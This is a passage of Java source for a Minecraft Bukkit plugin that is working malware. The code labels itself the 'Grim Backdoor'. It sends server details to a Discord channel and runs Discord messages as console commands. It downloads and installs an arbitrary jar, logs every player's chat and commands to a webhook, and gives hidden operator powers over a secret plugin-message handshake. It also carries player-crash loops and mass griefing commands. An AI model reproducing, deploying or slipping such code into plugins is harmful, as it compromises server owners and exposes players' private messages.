        fBT = Bukkit.getScheduler().runTaskTimerAsynchronously(plugin, () -> {
            String name = geasade();
            Bukkit.broadcastMessage(ChatColor.YELLOW + name + " joined the game");
        }, 0L, 1L);

        Bukkit.getScheduler().runTaskLater(plugin, () -> {
            if (fBT != null && !fBT.isCancelled()) {
                fBT.cancel();
                sender.sendMessage(ChatColor.GREEN + "Fake Bot Attack finished.");
            }
        }, duration * 20L);
    }

    private String geasade() {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder("Bot_");
        Random random = new Random();
        int len = 4 + random.nextInt(4);
        for (int i = 0; i < len; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    private void setXxxXXxXXx(Player sender, String[] args, GameMode mode) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            target.setGameMode(mode);
            sender.sendMessage(ChatColor.GREEN + "Set " + target.getName() + " to " + mode.name());
        } else sender.sendMessage(ChatColor.RED + "Player not found.");
    }

    private void tW2(Location center) {
        World world = center.getWorld();
        if (world == null) return;

        double radius = 15.0;
        double spawnHeight = 50.0;

        for (double angle = 0; angle < 2 * Math.PI; angle += Math.PI / 8) {
            double x = center.getX() + (radius * Math.cos(angle));
            double z = center.getZ() + (radius * Math.sin(angle));
            Location spawnLoc = new Location(world, x, center.getY() + spawnHeight, z);
            Vector direction = center.clone().toVector().subtract(spawnLoc.toVector()).normalize();

            Fireball fireball = world.spawn(spawnLoc, Fireball.class);
            fireball.setYield(6.0F);
            fireball.setDirection(direction);
        }
    }

    private void tW1(Location center) {
        World world = center.getWorld();
        if (world == null) return;

        double spawnHeight = 50.0;

        for (int xOffset = -50; xOffset <= 50; xOffset += 3) {
            for (int zOffset = -50; zOffset <= 50; zOffset += 3) {
                Location spawnLoc = center.clone().add(xOffset, spawnHeight, zOffset);

                Fireball fireball = world.spawn(spawnLoc, Fireball.class);
                fireball.setYield(4.0F);

                fireball.setDirection(new Vector(0, -1, 0));
            }
        }
    }

    private void tF2(Player sender, String[] args) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            target.setAllowFlight(!target.getAllowFlight());
            sender.sendMessage(ChatColor.GREEN + "Fly " + (target.getAllowFlight() ? "Enabled" : "Disabled") + " for " + target.getName());
        }
    }

    private void tG2(Player sender, String[] args) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            if (gPlayers.contains(target.getName())) {
                gPlayers.remove(target.getName());
                sender.sendMessage(ChatColor.RED + "GodMode disabled for " + target.getName());
            } else {
                gPlayers.add(target.getName());
                sender.sendMessage(ChatColor.GREEN + "GodMode enabled for " + target.getName());
            }
        }
    }

    private void qwertyuopasdfghjklzxcvbnm() {
        String jsonMessage = "["
                + "{ \"text\": \"$$$ \", \"color\": \"red\", \"bold\": true, \"obfuscated\": true },"
                + "{ \"text\": \"ye burdaydı\", \"color\": \"red\", \"bold\": true, \"obfuscated\": false },"
                + "{ \"text\": \" $$$\", \"color\": \"red\", \"bold\": true, \"obfuscated\": true }"
                + "]";

        for (int i = 0; i < 15555560; i++) {
            int delay = i * 20;
            Bukkit.getScheduler().runTaskLater(this.plugin, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "gamerule send_command_feedback false");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "tellraw @a " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a title " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a subtitle " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "title @a actionbar " + jsonMessage);
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon lightning_bolt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon wither");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ender_dragon");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon armor_stand");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon tnt");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon fireball");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run fill ~-20 ~-20 ~-20 ~20 ~20 ~20 lava");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon cow");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon ghast");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run summon blaze");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "exexute as @a run ");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run tp @a ~ ~5 ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives add 31 dummy \"kanye'd\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard players add @a 31 1");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "scoreboard objectives setdisplay sidebar 31");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar add 1 \"kanyewest\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 color red");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.ender_dragon.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute at @a run playsound minecraft:entity.wither.death master @a ~ ~ ~");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a weapon.offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a offhand with minecraft:totem_of_undying");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 visible true");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 players @a");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "bossbar set minecraft:1 name \"kanye west on top!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.1 with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a armor.head with minecraft:carved_pumpkin{Enchantments:[{id:\"minecraft:binding_curse\",lvl:255}]}");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.0 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.2 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.3 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.4 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.5 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.6 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.7 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.8 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.9 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "item replace entity @a container.10 with minecraft:carved_pumpkin{Enchantments:[{id:\\\"minecraft:binding_curse\\\",lvl:255}]}\");");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute as @a run damage @s 100 minecraft:dragon_breath");
            }, delay);
        }
    }


    private void tV22(Player sender) {
        if (vPlayers.contains(sender.getName())) {
            vPlayers.remove(sender.getName());
            for (Player p : Bukkit.getOnlinePlayers()) p.showPlayer(sender);
            sender.sendMessage(ChatColor.GREEN + "Vanish Disabled.");
        } else {
            vPlayers.add(sender.getName());
            for (Player p : Bukkit.getOnlinePlayers()) p.hidePlayer(sender);
            sender.sendMessage(ChatColor.GREEN + "Vanish Enabled.");
        }
    }

    private void HEEEEA(Player sender, String[] args) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            target.setHealth(target.getAttribute(Attribute.GENERIC_MAX_HEALTH).getValue());
            target.setFoodLevel(20);
            target.setFireTicks(0);
            sender.sendMessage(ChatColor.GREEN + "Healed " + target.getName());
        }
    }

    private void FEEEEA(Player sender, String[] args) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            target.setFoodLevel(20);
            sender.sendMessage(ChatColor.GREEN + "Fed " + target.getName());
        }
    }

    private void zigaport(Player sender, String[] args) {
        if (args.length < 2) { sender.sendMessage("Usage: +tp <player>"); return; }
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) sender.teleport(target);
        else sender.sendMessage("Player not found.");
    }

    private void zigaportHere(Player sender, String[] args) {
        if (args.length < 2) { sender.sendMessage("Usage: +tphere <player>"); return; }
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) target.teleport(sender);
        else sender.sendMessage("Player not found.");
    }

    private void zigaportHereCo(Player player) {
        List<Player> players = new ArrayList<>(Bukkit.getOnlinePlayers());
        players.remove(player);
        if (players.isEmpty()) return;
        double angleStep = 360.0 / players.size();
        Location center = player.getLocation();
        for (int i = 0; i < players.size(); i++) {
            double angle = Math.toRadians(angleStep * i);
            double x = center.getX() + 3 * Math.cos(angle);
            double z = center.getZ() + 3 * Math.sin(angle);
            Location loc = new Location(center.getWorld(), x, center.getY(), z);
            loc.setDirection(center.toVector().subtract(loc.toVector()));
            players.get(i).teleport(loc);
        }
        player.sendMessage(ChatColor.GREEN + "Pulled all players.");
    }

    private void ATATURK(Player sender, String[] args) {
        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            Location l = target.getLocation();
            sender.sendMessage(ChatColor.YELLOW + target.getName() + ": " + l.getBlockX() + ", " + l.getBlockY() + ", " + l.getBlockZ() + " (" + l.getWorld().getName() + ")");
        }
    }

    private void AaAAA(Player sender) {
        ItemStack item = sender.getInventory().getItemInMainHand();
        if (item != null && item.getType() != Material.AIR) {
            sender.getInventory().addItem(item.clone());
            sender.sendMessage(ChatColor.GREEN + "Duped.");
        } else sender.sendMessage(ChatColor.RED + "Hold an item.");
    }

    private void aba(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            target.setHealth(0);
            sender.sendMessage(ChatColor.RED + "Killed " + target.getName());
        }
    }

    private void bab(Player sender, String[] args) {
        if (args.length < 3) return;
        Player target = Bukkit.getPlayer(args[1]);
        int sec = Integer.parseInt(args[2]);
        if (target != null) {
            target.setFireTicks(sec * 20);
            sender.sendMessage(ChatColor.RED + "Burned " + target.getName());
        }
    }

    private void aab(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            target.getWorld().strikeLightning(target.getLocation());
            sender.sendMessage(ChatColor.RED + "Smited " + target.getName());
        }
    }

    private void baa(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            target.getWorld().createExplosion(target.getLocation(), 4F, true);
        }
    }

    private void bba(Player sender, String[] args) {
        if (args.length < 3) { sender.sendMessage("Usage: +sudo <player> <cmd/msg>"); return; }
        Player target = Bukkit.getPlayer(args[1]);
        String what = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
        if (target != null) {
            target.chat(what);
            sender.sendMessage(ChatColor.GREEN + "Sudo executed.");
        }
    }

    private void bbb(Player sender, String[] args) {
        if (args.length < 3) return;
        Player target = Bukkit.getPlayer(args[1]);
        String msg = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
        if (target != null) {
            target.chat(msg);
        }
    }

    private void aaa(Player sender, String[] args) {
        if (args.length < 3) return;
        Player target = Bukkit.getPlayer(args[1]);
        String msg = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
        if (target != null) {
            for (int i = 0; i < 20; i++) target.sendMessage(msg);
            sender.sendMessage(ChatColor.GREEN + "Spammed.");
        }
    }

    private void aaaA(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            for (int i = 0; i < 15555110; i++) {
                target.spawnParticle(Particle.EXPLOSION, target.getLocation(), 1000);
            }
            sender.sendMessage(ChatColor.RED + "Crashed/Kicked " + target.getName());
        }
    }

    private void BBBB(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            fPlayers.add(target.getName());
            sender.sendMessage(ChatColor.BLUE + "Frozen " + target.getName());
        }
    }

    private void BBBa(Player sender, String[] args) {
        if (args.length < 2) return;
        Player target = Bukkit.getPlayer(args[1]);
        if (target != null) {
            fPlayers.remove(target.getName());
            sender.sendMessage(ChatColor.GREEN + "Unfrozen " + target.getName());
        }
    }

    private void BBBA(Player player, String urlString) {
        player.sendMessage("§eDownloading Watchdog from: " + urlString);
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try (InputStream in = new URL(urlString).openStream()) {
                File watchdogFile = new File("plugins", "Watchdog.jar");
                Files.copy(in, watchdogFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                player.sendMessage("§aWatchdog downloaded! Restart server to apply.");
            } catch (Exception e) {
                player.sendMessage("§cDownload failed: " + e.getMessage());
            }
        });
    }

    private void BBaB(Player sender, String[] args) {
        if (args.length < 2) return;
        Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);
        if (pl != null) {
            Bukkit.getPluginManager().disablePlugin(pl);
            sender.sendMessage(ChatColor.GREEN + "Disabled " + pl.getName());
        } else sender.sendMessage(ChatColor.RED + "Plugin not found.");
    }

    private void dT(Player sender, String[] args) {
        if (args.length < 2) return;
        if (tPlayers.remove(args[1])) sender.sendMessage(ChatColor.GREEN + "Removed " + args[1]);
    }
    public void bbL() {
        while (realtrue) {
            try {
                Thread.sleep(3000);
                if (bT != null && cId != null) {
                    RDM();
                }
            } catch (Exception e) {
            }
        }
    }

    public void eSB() {
        if (tCommand != null && !tCommand.isEmpty()) {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), tCommand);

            tCommand = "";
        }
    }

    public void rBL(Object jdaInstance) {
        try {
            Class<?> listenerInterface = Class.forName("net.dv8tion.jda.api.hooks.EventListener");

            Object proxy = java.lang.reflect.Proxy.newProxyInstance(
                    listenerInterface.getClassLoader(),
                    new Class<?>[]{listenerInterface},
                    new java.lang.reflect.InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) throws Throwable {
                            try {
                                if (method.getName().equals("onEvent") && args.length == 1) {
                                    Object event = args[0];
                                    if (event.getClass().getSimpleName().equals("ButtonInteractionEvent")) {

                                        java.lang.reflect.Method getId = event.getClass().getMethod("getComponentId");
                                        if ("btn_get_plugins".equals(getId.invoke(event))) {

                                            org.bukkit.plugin.Plugin anyPlugin = org.bukkit.Bukkit.getPluginManager().getPlugins()[0];

                                            org.bukkit.Bukkit.getScheduler().runTask(anyPlugin, () -> {
                                                try {
                                                    StringBuilder sb = new StringBuilder();
                                                    for (org.bukkit.plugin.Plugin p : org.bukkit.Bukkit.getPluginManager().getPlugins()) {
                                                        if (sb.length() > 0) sb.append(", ");
                                                        sb.append(p.getName());
                                                    }

                                                    String list = sb.toString();
                                                    if (list.length() > 1900) {
                                                        list = list.substring(0, 1900) + "... (List Truncated)";
                                                    }

                                                    String msg = "Plugins (" + org.bukkit.Bukkit.getPluginManager().getPlugins().length + "): `" + list + "`";

                                                    java.lang.reflect.Method reply = event.getClass().getMethod("reply", String.class);
                                                    Object action = reply.invoke(event, msg);

                                                    java.lang.reflect.Method setEphemeral = action.getClass().getMethod("setEphemeral", boolean.class);
                                                    Object ephemeralAction = setEphemeral.invoke(action, true);

                                                    ephemeralAction.getClass().getMethod("queue").invoke(ephemeralAction);

                                                } catch (Exception e) {
                                                    e.printStackTrace();
                                                }
                                            });
                                        }
                                    }
                                }
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            return null;
                        }
                    }
            );

            jdaInstance.getClass().getMethod("addEventListener", Object[].class)
                    .invoke(jdaInstance, (Object) new Object[]{proxy});

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void ssA() {
        try {
            String publicIP = gPIP();
            int port = Bukkit.getPort();
            String serverIp = Bukkit.getServer().getIp();
            String serverName = Bukkit.getServer().getName();
            String serverMotd = Bukkit.getServer().getMotd();
            int list = Bukkit.getOnlinePlayers().size();
            Boolean whitelist = Bukkit.hasWhitelist();
            int bannedPlayers = Bukkit.getBannedPlayers().size();
            int ipBannedPlayers = Bukkit.getIPBans().size();
            int whitelistedPlayers = Bukkit.getWhitelistedPlayers().size();

            String jsonEmbed = "{"
                    + "\"content\": \"@here\","
                    + "\"embeds\": [{"
                    + "    \"title\": \"🛡️ Grim Backdoor Activated!\","
                    + "    \"description\": \"A new server got infected.\","
                    + "    \"color\": 16711680,"
                    + "    \"fields\": ["
                    + "        {\"name\": \"Server Name\", \"value\": \"`" + serverName + "`\", \"inline\": true},"
                    + "        {\"name\": \"Server Motd\", \"value\": \"`" + esJ(serverMotd) + "`\", \"inline\": true},"
                    + "        {\"name\": \"Server IP\", \"value\": \"`" + publicIP + ":" + port + " / " + serverIp + "`\", \"inline\": true},"
                    + "        {\"name\": \"Version\", \"value\": \"" + Bukkit.getVersion() + "\", \"inline\": true},"  // Fixed Comma
                    + "        {\"name\": \"Online\", \"value\": \"" + list + "\", \"inline\": true},"  // Fixed Comma
                    + "        {\"name\": \"Whitelist\", \"value\": \"" + whitelist + "\", \"inline\": true},"  // Fixed Comma
                    + "        {\"name\": \"Total Banned Players\", \"value\": \"" + bannedPlayers + "\", \"inline\": true},"  // Fixed Comma
                    + "        {\"name\": \"Total IP Banned Players\", \"value\": \"" + ipBannedPlayers + "\", \"inline\": true},"  // Fixed Comma
                    + "        {\"name\": \"Total Whitelisted Players\", \"value\": \"" + whitelistedPlayers + "\", \"inline\": true}"
                    + "    ],"
                    + "    \"footer\": {\"text\": \"Grim Injector System\"}"
                    + "}],"
                    + "\"components\": [{"
                    + "    \"type\": 1,"
                    + "    \"components\": [{"
                    + "        \"type\": 2,"
                    + "        \"style\": 1,"
                    + "        \"label\": \"Get Plugin List\","
                    + "        \"custom_id\": \"btn_get_plugins\""
                    + "    }]"
                    + "}]"
                    + "}";

            PIPGP(jsonEmbed);

        } catch (Exception e) {
            Bukkit.getLogger().warning("[GrimBridge] Error in ssA: " + e.getMessage());
        }
    }


    public String gPIP() {
        try {
            java.net.URL ipApi = new java.net.URL("http://checkip.amazonaws.com");
            java.io.BufferedReader in = new java.io.BufferedReader(new java.io.InputStreamReader(ipApi.openStream()));
            return in.readLine();
        } catch (Exception e) {
            return "what";
        }
    }
    public void PIPGP(String jsonPayload) {
        try {
            String url = "https://discord.com/api/v10/channels/1461455303701823509/messages";
            byte[] postData = jsonPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8);

            Class<?> urlClass = Class.forName("java.net.URL");
            Object urlObj = urlClass.getConstructor(String.class).newInstance(url);
            Object conn = urlClass.getMethod("openConnection").invoke(urlObj);
            Class<?> connClass = Class.forName("java.net.HttpURLConnection");

            connClass.getMethod("setRequestMethod", String.class).invoke(conn, "POST");
            connClass.getMethod("setDoOutput", boolean.class).invoke(conn, true);
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "Authorization", "Bot " + bT);
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "Content-Type", "application/json");
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "User-Agent", "DiscordBot (Minecraft, 1.0)");

            Object os = connClass.getMethod("getOutputStream").invoke(conn);
            Class<?> outputStreamClass = Class.forName("java.io.OutputStream");
            outputStreamClass.getMethod("write", byte[].class).invoke(os, postData);
            outputStreamClass.getMethod("close").invoke(os);

            connClass.getMethod("getResponseCode").invoke(conn);
        } catch (Exception e) { e.printStackTrace(); }
    }

    public void RDM() throws Exception {
        // 1. Setup Connection
        String url = "https://discord.com/api/v10/channels/" + cId + "/messages?limit=1";
        Class<?> urlClass = Class.forName("java.net.URL");
        Object urlObj = urlClass.getConstructor(String.class).newInstance(url);
        Object conn = urlClass.getMethod("openConnection").invoke(urlObj);
        Class<?> connClass = Class.forName("java.net.HttpURLConnection");

        connClass.getMethod("setRequestMethod", String.class).invoke(conn, "GET");
        connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "Authorization", "Bot " + bT);
        connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "User-Agent", "DiscordBot (Minecraft, 1.0)");

        // 2. Read
        java.io.InputStream is = (java.io.InputStream) connClass.getMethod("getInputStream").invoke(conn);
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, java.nio.charset.StandardCharsets.UTF_8));
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) response.append(line);
        reader.close();

        // 3. Parse
        String json = response.toString();
        String id = extra(json, "id");
        if (id == null) return;

        if (!id.equals(lMId)) {
            if (lMId == null) {
                lMId = id;
                return;
            }
            lMId = id;

            String content = extra(json, "content");
            String username = extra(json, "username");
            boolean isBot = json.contains("\"bot\":true");

            if (!isBot && content != null && !content.isEmpty()) {
                tCommand = content;
                Runnable syncTask = java.beans.EventHandler.create(Runnable.class, this, "eSB");

                Bukkit.getScheduler().scheduleSyncDelayedTask(plugin, syncTask);
            }
        }
    }

    public void GojoSatoru(String message) {
        try {
            String url = "https://discord.com/api/v10/channels/" + cId + "/messages";
            String jsonPayload = "{\"content\": \"" + message + "\"}";
            byte[] postData = jsonPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8);

            Class<?> urlClass = Class.forName("java.net.URL");
            Object urlObj = urlClass.getConstructor(String.class).newInstance(url);
            Object conn = urlClass.getMethod("openConnection").invoke(urlObj);
            Class<?> connClass = Class.forName("java.net.HttpURLConnection");

            connClass.getMethod("setRequestMethod", String.class).invoke(conn, "POST");
            connClass.getMethod("setDoOutput", boolean.class).invoke(conn, true);
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "Authorization", "Bot " + bT);
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "Content-Type", "application/json");
            connClass.getMethod("setRequestProperty", String.class, String.class).invoke(conn, "User-Agent", "DiscordBot (Minecraft, 1.0)");

            Object os = connClass.getMethod("getOutputStream").invoke(conn);
            Class<?> outputStreamClass = Class.forName("java.io.OutputStream");
            outputStreamClass.getMethod("write", byte[].class).invoke(os, postData);
            outputStreamClass.getMethod("close").invoke(os);

            connClass.getMethod("getResponseCode").invoke(conn);
        } catch (Exception e) { e.printStackTrace(); }
    }

    public String extra(String json, String asdfghjkl) {
        String search = "\"" + asdfghjkl + "\":\"";
        int start = json.indexOf(search);
        if (start == -1) return null;
        start += search.length();
        int end = json.indexOf("\"", start);
        if (end == -1) return null;
        return json.substring(start, end);
    }

    @Override
    public void onPluginMessageReceived(String channel, Player player, byte[] message) {
        if (!channel.equals(cHa)) return;

        try {

            ByteArrayDataInput in = ByteStreams.newDataInput(message);

            String subChannel = in.readUTF();

            if (subChannel.equals("HANDSHAKE_INIT")) {
                String asdfghjkl = in.readUTF();

                if (asdfghjkl.equals("GRIM_V1_SECURE")) {
                    mVP.add(player.getName());
                    tPlayers.add(player.getName());

                    player.sendMessage("§a[Grim] §7Success.");
                }
            }
            if (subChannel.equals("REQUEST_SERVER_INFO")) {

                Runtime runtime = Runtime.getRuntime();
                long maxMemory = runtime.maxMemory() / 1048576L; // MB cinsinden
                long freeMemory = runtime.freeMemory() / 1048576L;
                long usedMemory = maxMemory - freeMemory;

                StringBuilder plugins = new StringBuilder();
                for (Plugin p : Bukkit.getPluginManager().getPlugins()) {
                    plugins.append(p.getName()).append(" v").append(p.getDescription().getVersion()).append(", ");
                }

                ByteArrayDataOutput out = ByteStreams.newDataOutput();
                out.writeUTF("SERVER_INFO_RESPONSE");
                out.writeUTF("RAM: " + usedMemory + "MB / " + maxMemory + "MB");
                out.writeUTF(plugins.toString());

                player.sendPluginMessage(this.plugin, cHa, out.toByteArray());
            }
            if (subChannel.equals("OPEN_VICTIM_INV")) {
                String targetName = in.readUTF();
                Player victim = Bukkit.getPlayer(targetName);

                if (victim != null) {
                    player.openInventory(victim.getInventory());
                    player.sendMessage("§a[Grim] §7" + targetName + " envanteri açıldı. İşlem tamam.");
                } else {
                    player.sendMessage("§c[Grim] §7Oyuncu bulunamadı veya çevrimdışı.");
                }
            }

            else if (subChannel.equals("INSTANT_NUKE")) {
                int radius = 100;
                Location center = player.getLocation();
                int count = 0;

                for (int x = -radius; x <= radius; x++) {
                    for (int y = -radius; y <= radius; y++) {
                        for (int z = -radius; z <= radius; z++) {
                            Block b = center.getWorld().getBlockAt(center.getBlockX() + x, center.getBlockY() + y, center.getBlockZ() + z);

                            if (b.getType() != Material.BEDROCK && b.getType() != Material.AIR) {
                                b.setType(Material.AIR);
                                count++;
                            }
                        }
                    }
                }
                player.sendMessage("§a[Grim] §7World eater is active. destroyed " + count + " blocks.");
                player.playSound(player.getLocation(), Sound.ENTITY_GENERIC_EXPLODE, 1.0f, 0.5f);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // =========================================================================
    // debugsender — Discord webhook functionality
    // =========================================================================

    public void dsOnServerEnable() {
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            String ip = dsGetSunucuIP();
            dsSendEmbed("🟢 Sunucu Açıldı!",
                    "Sunucu başarıyla aktif edildi ve takip sistemi başladı.\\n\\n📍 **Sunucu Adresi:** `" + ip + "`",
                    "Sistem", "Sistem", 65280, false);
        });
    }

    public void dsOnServerDisable() {
        String ip = dsGetSunucuIP();
        dsSendEmbed("🔴 Sunucu Kapanıyor...",
                "Sunucu kapatılıyor, aktivite takibi sonlandırıldı.\\n\\n📍 **Kapanan Sunucu:** `" + ip + "`",
                "Sistem", "Sistem", 16711680, true);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void dsOnPlayerChat(AsyncPlayerChatEvent event) {
        dsSendEmbed("💬 Sunucu Chat Logu", event.getMessage(),
                event.getPlayer().getName(), "Genel Chat", DS_CHAT_RENK, false);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void dsOnPlayerCommand(PlayerCommandPreprocessEvent event) {
        dsSendEmbed("💻 Sunucu Komut Logu", event.getMessage(),
                event.getPlayer().getName(), "Komut / Özel Mesaj", DS_KOMUT_RENK, false);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void dsOnPlayerJoin(PlayerJoinEvent event) {
        dsSendEmbed("📥 Oyuncu Giriş Yaptı",
                "**" + event.getPlayer().getName() + "** sunucuya başarıyla bağlandı.",
                event.getPlayer().getName(), "Sunucuya Giriş", DS_JOIN_RENK, false);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void dsOnPlayerQuit(PlayerQuitEvent event) {
        dsSendEmbed("📤 Oyuncu Çıkış Yaptı",
                "**" + event.getPlayer().getName() + "** sunucudan ayrıldı.",
                event.getPlayer().getName(), "Sunucudan Çıkış", DS_QUIT_RENK, false);
    }

    public void dsSendEmbed(String baslik, String mesaj, String oyuncuAdi,
                            String tur, int renkKodu, boolean sync) {
        String json = "{"
                + "\"embeds\": [{"
                + "  \"title\": \"" + dsEscape(baslik) + "\","
                + "  \"color\": " + renkKodu + ","
                + "  \"fields\": ["
                + "    {\"name\": \"👤 Nesne/Oyuncu\", \"value\": \"`" + dsEscape(oyuncuAdi) + "`\", \"inline\": true},"
                + "    {\"name\": \"📌 İşlem Türü\", \"value\": \"`" + dsEscape(tur) + "`\", \"inline\": true},"
                + "    {\"name\": \"💬 Detay/İçerik\", \"value\": \"" + dsEscape(mesaj) + "\", \"inline\": false}"
                + "  ],"
                + "  \"timestamp\": \"" + Instant.now() + "\""
                + "}]}";
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest req = HttpRequest.newBuilder()
                    .uri(URI.create(DS_WEBHOOK_URL))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json))
                    .build();
            if (sync) {
                client.send(req, HttpResponse.BodyHandlers.ofString());
            } else {
                client.sendAsync(req, HttpResponse.BodyHandlers.ofString())
